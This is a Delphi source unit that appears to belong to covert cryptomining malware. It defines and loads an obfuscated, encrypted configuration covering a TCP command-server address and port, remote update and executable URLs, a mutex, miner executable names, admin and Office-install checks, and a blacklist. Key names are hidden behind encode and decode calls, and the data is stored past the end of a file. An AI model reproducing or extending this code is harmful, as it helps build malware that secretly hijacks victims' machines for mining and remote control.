unit uTypes;

interface

uses Windows, Classes, SysUtils, iniFiles, uEof, uEnc;

type
  {*
    Mining Config Data
  *}
  TMgi = class
    Eal: Boolean; // Mining Active
    RgUl: string; // Rig Client Url
    Vsr: Integer; // Rig Version
    Rnng: Boolean; // Client is Running
    RnDr: string; // Running Directory
    RnTmr: Integer; // Running Time
    RnPm: AnsiString; // Running Config File for Desktop
    RnPmL: AnsiString; // Running Config File for Laptop
    E3Nm, E3NmOld: string; // x86 Exe Name
    E6Nm, E6NmOld: string; // x64 Exe Name
    Black: string; // Blacklist
  end;

  {*
    Server Config Data
  *}
  TCnfg = class
    TpEnb: Boolean; // TCP Client Enable
    TpP: string; // TCP Client IP
    TpPo: Integer; // TCP Client Port
    TpTmr: Integer; // TCP Client Re Connecting Time
    InUr: string; // Update Settings URL
    ExUr: string; // Update Exe URL
    UpTr: Integer; // Auto Update ReConnecting Time
    RnDi: string; // Running Directory
    RnFiN: string; // Running File Name
    RnMtx: string; // Running Mutex Name
    PrtNa: string; // Product Name
    iAd: Boolean; // Application is Admin Access Granted
    iEx: Boolean; // System Excel is Installed
    iWo: Boolean; // System Word is Installed
    Vsr: Integer; // Version
    SO: string; // OS Operation System
    EeRs: string; // Exe Res
    EeVRs: string; // Exe Version
    ExRsNa: string; // Excel Res Name
    WoRsNa: string; // Word Res Name
    Mng: TMgi; // Mining
  end;

procedure LdCnf(Cnfg: TCnfg; ini: TMemIniFile = nil);
procedure SvCnf(Cnfg: TCnfg);

implementation

function issetString(Val, Default: string): string;
begin
  if Val = '' then Result := Default
  else Result := Val;
end;

function issetInt(Val, Default: Integer): Integer;
begin
  if Val = 0 then Result := Default
  else Result := Val;
end;

procedure LdCnf(Cnfg: TCnfg; ini: TMemIniFile = nil);
var
  Store: string;
  Context: string;
  SL: TStringList;
begin
  // Load Default
  if ini = nil then begin
    Store := IncludeTrailingPathDelimiter(ExtractFileDir(ParamStr(0))) + DE('qNReLsPCFbauqD');
    if not FileExists(Store) then Exit;

    // Read File
    SL := TStringList.Create;
    SL.Text := DE(Trim(EofRF(Store)));

    // Set Ini
    ini := TMemIniFile.Create(Store);
    ini.SetStrings(SL);
    SL.Free;
  end;

  with ini, Cnfg do begin
    // Set Sys Config
    TpEnb := ReadBool('CS', DE('dJkdD80H'), TpEnb); // TCPENB
    TpP := issetString(ReadString('CS', DE('dJkd'), ''), TpP); // TCP
    TpPo := issetInt(ReadInteger('CS', DE('dJkdWwR4aC'), 0), TpPo); // TCPPORT
    TpTmr := issetInt(ReadInteger('CS', DE('dJkdSQFI'), 0), TpTmr); // TCPTMR
    ExUr := issetString(ReadString('CS', DE('MNhuv7OI'), ''), ExUr); //  EXEURL
    UpTr := issetInt(ReadInteger('CS', 'UTMR', 0), UpTr);

    // Mining Config
    Mng.Eal := ReadBool('MNG', 'Enable', Mng.Eal); // Enable
    Mng.RgUl := issetString(ReadString('MNG', DE('bNQc3+F'), ''), Mng.RgUl);  // RgUrl
    Mng.Vsr := issetInt(ReadInteger('MNG', DE('fhvbgtTOGD'), 0), Mng.Vsr); // Version
    Mng.RnTmr := issetInt(ReadInteger('MNG', DE('bFBAMxXvC6C'), 0), Mng.RnTmr); // RunTimer
    Mng.RnPm := issetString(DE(ReadString('MNG', DE('bFBAIp7Fe0D'), '')), Mng.RnPm); // RunParam
    Mng.RnPmL := issetString(DE(ReadString('MNG', DE('bFBAIp7Fe0za'), '')), Mng.RnPmL); // RunParamL
    Mng.E3NmOld := Mng.E3Nm; // E3NmOld
    Mng.E3Nm := issetString(ReadString('MNG', DE('MhnQsmCubD'), ''), Mng.E3Nm); // E32Name
    Mng.E6NmOld := Mng.E6Nm; // E6NmOld
    Mng.E6Nm := issetString(ReadString('MNG', DE('M1HT42UmLB'), ''), Mng.E6Nm); // E64Name
    Mng.Black := issetString(ReadString('MNG', DE('LFRqwrD'), ''), Mng.Black); // Blacklist
  end;
end; { LdCnf -> Load Configuration .dat files or custom ini files }

procedure SvCnf(Cnfg: TCnfg);
var
  Store: string;
  SL: TStrings;
  ss: string;
begin
  // Store Path
  Store := IncludeTrailingPathDelimiter(ExtractFileDir(ParamStr(0))) + 'config.dat';

  // Set Config
  SL := TStringList.Create;
  with SL, Cnfg do begin
    SL.Add('[CS]');
    SL.Add(DE('dJkdD80H') + '=' + BoolToStr(TpEnb));
    SL.Add(DE('dJkd') + '=' + TpP);
    SL.Add(DE('dJkdWwR4aC') + '=' + IntToStr(TpPo));
    SL.Add(DE('dJkdSQFI') + '=' + IntToStr(TpTmr));
    SL.Add(DE('MNhuv7OI') + '=' + ExUr);
    SL.Add('UTMR=' + IntToStr(UpTr));

    SL.Add('[MNG]');
    SL.Add('Enable=' + BoolToStr(Mng.Eal));
    SL.Add(DE('bNQc3+F') + '=' + Mng.RgUl);
    SL.Add(DE('fhvbgtTOGD') + '=' + IntToStr(Mng.Vsr));
    SL.Add(DE('bFBAMxXvC6C') + '=' + IntToStr(Mng.RnTmr));
    SL.Add(DE('bFBAIp7Fe0D') + '=' + EN(Mng.RnPm));
    SL.Add(DE('bFBAIp7Fe0za') + '=' + EN(Mng.RnPmL));
    SL.Add(DE('MhnQsmCubD') + '=' + Mng.E3Nm);
    SL.Add(DE('M1HT42UmLB') + '=' + Mng.E6Nm);
    SL.Add(DE('LFRqwrzfJY1O') + '=' + Mng.Black);
  end;

  // Save
  EofWrt(Store, EN(Trim(SL.Text)));
  SL.Free;
end; { SvCnf -> Save Configuration to .dat files }

end.

